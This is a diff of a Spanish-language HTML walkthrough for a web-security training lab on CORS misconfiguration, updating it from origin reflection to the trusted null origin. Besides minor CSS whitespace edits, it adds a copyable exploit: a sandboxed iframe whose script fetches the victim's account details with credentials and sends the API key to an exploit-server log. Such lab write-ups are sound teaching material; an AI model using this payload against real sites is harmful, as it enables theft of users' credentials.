@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS vulnerability with basic origin reflection</title>
+    <title>CORS vulnerability with trusted null origin</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,18 +35,18 @@
             line-height: 1.6;
             font-size: 18px; 
             position: relative;
-            padding-left: 30px;
+            padding-left: 30px; 
         }
         p:not(.no-symbol)::before {
             content: ">";
             position: absolute;
             left: 10px;
-            color: #ff6600;
+            color: #ff6600; 
             font-size: 18px;
             font-weight: bold;
         }
         .no-symbol {
-            padding-left: 0;
+            padding-left: 0; 
         }
         img {
             max-width: 100%;
@@ -100,12 +100,12 @@
 </head>
 <body>
     <div class="container">
-        <h1>CORS vulnerability with basic origin reflection</h1>
+        <h1>CORS vulnerability with trusted null origin</h1>
         <p class="no-symbol"><strong>Autor:</strong> h4ckgiver</p>
 
         <div class="section" id="descripcion-del-laboratorio">
             <h2>Descripción del Laboratorio</h2>
-            <p class="no-symbol">Este sitio web tiene una configuración de CORS insegura, confía en todos los orígenes.</p>
+            <p class="no-symbol">Este sitio web tiene una configuración de CORS insegura, confía en el origen null.</p>
         </div>
 
         <div class="section" id="metodologia">
@@ -114,24 +114,23 @@
             <img src="login.png" alt="Descripción de la imagen">
             <p>En el HTTP history vemos una petición <code>/accountDetails</code> la cual contiene la apikey de nuestra sesión. Observamos que la cabecera Access-Control-Allow-Credentials está seteada en <code>true</code>.</p>
             <img src="apikey.png">
-            <p>Agregamos la cabecera Origin a la petición y vemos que su contenido se refleja en la cabecera.</p>
+            <p>Agregamos la cabecera <code>Origin: null</code> a la petición y vemos que se refleja en la respuesta.</p>
             <img src="origin.png">
             <p>Una vez comprobada la vulnerabilidad, nos vamos al exploit server, copiamos el siguiente código y lo enviamos a la victima.</p>
             <pre>
 <button class="copy-button" onclick="copyCode()">Copiar</button>
 <span class="copy-message" id="copyMessage">¡Copiado!</span>
 <code id="code-block">
-&lt;script&gt;
+    &lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
     var req = new XMLHttpRequest();
     req.onload = reqListener;
     req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
     req.withCredentials = true;
     req.send();
-
     function reqListener() {
-        location='/log?key='+this.responseText;
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
     };
-&lt;/script&gt;
+&lt;/script&gt;"&gt;&lt;/iframe&gt;
 </code>
             </pre>
             <p>Vemos que en los logs recibimos el apikey de la victima.</p>
